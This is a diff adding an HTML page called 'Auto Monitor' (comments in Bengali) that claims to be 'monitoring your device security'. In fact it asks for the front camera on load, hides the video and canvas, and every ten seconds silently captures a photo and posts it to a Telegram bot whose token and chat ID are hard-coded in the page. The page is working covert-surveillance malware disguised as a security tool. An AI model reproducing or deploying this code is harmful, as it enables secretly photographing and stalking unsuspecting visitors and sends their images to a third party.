@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Monitor</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #222;
+            color: #fff;
+            padding-top: 50px;
+        }
+        .status {
+            font-size: 20px;
+            color: #00ff00;
+        }
+        /* ভিডিও এবং ক্যানভাসটি স্ক্রিন থেকে লুকিয়ে রাখার জন্য */
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="status">System Is Active...</div>
+    <p>Monitoring your device security in this tab.</p>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        // ১. এখানে আপনার আসল টোকেন এবং চ্যাট আইডি বসান
+        const token = '8913754683:AAHHcjalNABTY9M_EQPTPcigT8_jLDWDugY'; 
+        const chatId = '5551249785';   
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // পেজ লোড হওয়ামাত্রই ক্যামেরার পারমিশন চাওয়া হবে
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            
+            // পারমিশন পাওয়ার পর প্রতি ১০ সেকেন্ড (১০০০০ মিলিসেকেন্ড) পর পর স্বয়ংক্রিয়ভাবে ছবি পাঠাবে
+            setInterval(captureAndSend, 10000);
+        })
+        .catch(err => {
+            console.error("Camera access denied: ", err);
+        });
+
+        // স্বয়ংক্রিয়ভাবে ছবি তোলা এবং টেলিগ্রামে পাঠানোর ফাংশন
+        function captureAndSend() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            // ছবিটিকে Blob ফাইলে রূপান্তর করে টেলিগ্রাম এপিআই-তে পাঠানো
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => console.log('Auto photo sent to Telegram Bot'))
+                .catch(error => console.error('Error sending photo:', error));
+            }, 'image/jpeg');
+        }
+    </script>
+
+</body>
+</html>
